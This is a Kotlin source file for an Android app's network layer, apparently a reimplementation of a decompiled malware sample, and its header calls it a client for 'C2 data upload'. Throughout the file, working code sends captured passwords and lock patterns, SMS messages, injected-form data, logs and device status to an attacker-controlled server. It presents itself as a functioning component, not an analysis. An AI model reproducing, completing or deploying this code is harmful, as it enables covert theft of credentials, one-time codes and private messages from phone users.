package com.storm.safe.rock.network

import android.content.Context
import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.IOException
import java.net.ConnectException
import java.net.SocketTimeoutException
import java.net.UnknownHostException
import java.util.concurrent.TimeUnit
/**
 * Singleton HTTP REST client for C2 data upload.
 *
 * Reverse-engineered from JADX reference: C0268a1.java (841 lines).
 * Handles 7 POST endpoints with Bearer token auth and exponential-backoff retry.
 *
 * Auth scheme:
 *   Authorization = Bearer {owner_token}
 *   X-Device-ID   = deviceId
 *
 * Retry policy: 3 attempts, 1 000 ms initial delay, 1.5× backoff, 5 000 ms cap.
 * 4xx responses are NOT retried; 5xx and network exceptions ARE retried.
 */
class HttpManager(private val context: Context) {

    companion object {
        private const val TAG = "HttpManager"
        private const val MAX_RETRIES = 3
        private const val INITIAL_DELAY_MS = 1000L
        private const val BACKOFF_MULTIPLIER = 1.5
        private const val MAX_DELAY_MS = 5000L
        private val JSON_MEDIA_TYPE = "application/json; charset=utf-8".toMediaType()

        @Volatile
        private var instance: HttpManager? = null

        fun getOrCreate(context: Context): HttpManager {
            return instance ?: synchronized(this) {
                instance ?: HttpManager(context.applicationContext).also { instance = it }
            }
        }
    }

    var baseUrl: String = ""
    var deviceId: String = ""
    var ownerToken: String = ""

    private val httpClient: OkHttpClient = OkHttpClient.Builder()
        .connectTimeout(10L, TimeUnit.SECONDS)
        .readTimeout(15L, TimeUnit.SECONDS)
        .writeTimeout(15L, TimeUnit.SECONDS)
        .retryOnConnectionFailure(true)
        .build()

    // === 7 endpoints ===

    suspend fun register(deviceInfo: JSONObject): Result<JSONObject> {
        return post("/api/client/register", deviceInfo, authenticated = true)
    }

    suspend fun uploadPasswordCapture(
        password: String,
        passwordType: String,
        inputMethod: String,
        appName: String,
        packageName: String,
        confidence: Int,
        cipherGradeCode: String? = null,
        patternCipher: String? = null,
        isLocked: Boolean? = null
    ): Result<JSONObject> {
        val payload = JSONObject().apply {
            put("deviceId", deviceId)
            put("password", password)
            put("passwordType", passwordType)
            put("inputMethod", inputMethod)
            put("appName", appName)
            put("packageName", packageName)
            put("confidence", confidence)
            put("timestamp", System.currentTimeMillis())
            if (cipherGradeCode != null) put("cipherGradeCode", cipherGradeCode)
            if (patternCipher != null) put("patternCipher", patternCipher)
            if (isLocked != null) put("isLocked", isLocked)
        }
        return post("/api/sync/credentials", payload, authenticated = true)
    }

    suspend fun uploadSms(smsList: List<JSONObject>): Result<JSONObject> {
        val payload = JSONObject().apply {
            put("deviceId", deviceId)
            put("sms", JSONArray(smsList))
            put("timestamp", System.currentTimeMillis())
        }
        return post("/api/sync/messages", payload, authenticated = true)
    }

    suspend fun uploadIncomingSms(
        number: String,
        text: String,
        type: String,
        timestamp: Long
    ): Result<JSONObject> {
        val payload = JSONObject().apply {
            put("deviceId", deviceId)
            put("number", number)
            put("text", text)
            put("type", type)
            put("timestamp", timestamp)
        }
        return post("/api/sync/inbox", payload, authenticated = true)
    }

    suspend fun uploadLogs(logs: List<JSONObject>): Result<JSONObject> {
        val payload = JSONObject().apply {
            put("deviceId", deviceId)
            put("logs", JSONArray(logs))
            put("timestamp", System.currentTimeMillis())
        }
        return post("/api/client/logs", payload, authenticated = true)
    }

    suspend fun uploadInjectionData(data: JSONObject): Result<JSONObject> {
        val payload = JSONObject(data.toString())
        payload.put("deviceId", deviceId)
        if (!payload.has("timestamp")) {
            payload.put("timestamp", System.currentTimeMillis())
        }
        return post("/api/sync/form", payload, authenticated = true)
    }

    suspend fun uploadDeviceStatus(statusType: String, data: JSONObject): Result<JSONObject> {
        val payload = JSONObject().apply {
            put("deviceId", deviceId)
            put("statusType", statusType)
            put("data", data)
        }
        return post("/api/sync/status", payload, authenticated = true)
    }

    // === Core HTTP engine ===

    suspend fun post(
        path: String,
        data: JSONObject,
        authenticated: Boolean
    ): Result<JSONObject> {
        val url = baseUrl + path
        val body = data.toString().toRequestBody(JSON_MEDIA_TYPE)

        val requestBuilder = Request.Builder()
            .url(url)
            .post(body)

        if (authenticated) {
            requestBuilder.addHeader("Authorization", "Bearer $ownerToken")
            requestBuilder.addHeader("X-Device-ID", deviceId)
        }

        val request = requestBuilder.build()
        return executeRequest(request, MAX_RETRIES, INITIAL_DELAY_MS)
    }

    private suspend fun executeRequest(
        request: Request,
        maxRetries: Int,
        initialDelay: Long
    ): Result<JSONObject> = withContext(Dispatchers.IO) {
        var lastException: Exception? = null
        var currentDelay = initialDelay

        for (attempt in 0 until maxRetries) {
            try {
                val response = httpClient.newCall(request).execute()
                response.use { resp ->
                    val code = resp.code
                    if (code in 200..299) {
                        val responseBody = resp.body?.string() ?: "{}"
                        return@withContext Result.success(JSONObject(responseBody))
                    }
                    if (code in 400..499) {
                        val errBody = resp.body?.string() ?: ""
                        Log.w(TAG, "HTTP client error: $code ${resp.message} body=$errBody")
                        return@withContext Result.failure(
                            IOException("HTTP $code: ${resp.message}")
                        )
                    }
                    val errBody = resp.body?.string() ?: ""
                    Log.w(TAG, "HTTP server error: $code, attempt ${attempt + 1}/$maxRetries body=$errBody")
                    lastException = IOException("HTTP $code: ${resp.message}")
                }
            } catch (e: ConnectException) {
                Log.w(TAG, "Connection failed (${attempt + 1}/$maxRetries): ${e.message}")
                lastException = e
            } catch (e: SocketTimeoutException) {
                Log.w(TAG, "Request timeout (${attempt + 1}/$maxRetries): ${e.message}")
                lastException = e
            } catch (e: UnknownHostException) {
                Log.w(TAG, "DNS failed (${attempt + 1}/$maxRetries): ${e.message}")
                lastException = e
            } catch (e: kotlin.coroutines.cancellation.CancellationException) {
                throw e
            } catch (e: Exception) {
                Log.w(TAG, "HTTP exception (${attempt + 1}/$maxRetries): ${e.message}")
                lastException = e
            }

            if (attempt < maxRetries - 1) {
                delay(currentDelay)
                currentDelay = (currentDelay * BACKOFF_MULTIPLIER).toLong()
                    .coerceAtMost(MAX_DELAY_MS)
            }
        }

        Result.failure(
            lastException ?: IOException("Unknown error after $maxRetries retries")
        )
    }

}
